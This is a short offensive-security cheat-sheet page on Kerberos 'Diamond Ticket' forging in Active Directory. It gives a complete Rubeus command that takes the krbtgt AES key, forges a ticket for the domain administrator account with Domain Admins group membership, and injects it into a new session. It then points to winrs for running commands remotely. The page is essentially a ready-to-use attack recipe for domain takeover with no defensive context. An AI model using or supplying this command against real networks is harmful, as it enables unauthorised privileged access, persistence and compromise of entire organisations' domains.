# Ticket Forging

### Diamon ticket forging

Use Rubeus and the krbtgt credentials to create a Diamond Ticket

{% code overflow="wrap" %}
```powershell
C:\AD\Tools\Rubeus.exe diamond /krbkey:<krbtgt aes256> /tgtdeleg /enctype:aes /ticketuser:administrator /domain:<DOMAIN> /dc:<DC DOMAIN> /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```
{% endcode %}

and now you can user win-rs to execute commands
